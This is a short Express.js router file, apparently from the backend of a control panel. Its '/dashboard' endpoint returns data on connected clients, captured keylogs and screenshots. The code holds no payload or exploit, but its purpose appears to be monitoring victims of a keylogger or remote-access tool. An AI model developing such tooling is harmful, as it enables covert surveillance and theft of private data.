'use strict'

const express = require('express')
const router = express.Router()
const createHttpError = require('http-errors')

const clientService = require('../../services/clientService')
const keylogsService = require('../../services/keylogsService')
const screenshotService = require('../../services/screenshotService')

const clientsApi = require('./clients')
const authApi = require('./auth')


router.use('/clients', clientsApi)
router.use('/auth', authApi)

router.post('/dashboard', async (req, res, next) => {
    if (typeof req.session.user === 'undefined' || req.session.user === null) {
        next(createHttpError(401, 'Not connected'))
    }
    else {

        const clients = await clientService.getDataDashboard()
        const keylogs = await keylogsService.getDataDashboard()
        const screenshots = await screenshotService.getDataDashboard()

        res.json({
            clients: clients,
            keylogs: keylogs,
            screenshots: screenshots
        })
    }
})

//Page not found
router.all('*', (req, res, next) => {
    next(createHttpError(404, 'Endpoint not found'))
})

//Error handler
router.use((err, req, res, next) => {

    if (createHttpError.isHttpError(err)) {
        res.status(err.statusCode).json({
            error: err.expose ? err.message : 'Internal server error'
        })

        return
    }
    if (err instanceof Error) {
        res.status(500).json({
            error: err.message
        })
        return
    }

    res.status(500).json({
        error: 'Internal server error'
    })
})

module.exports = router
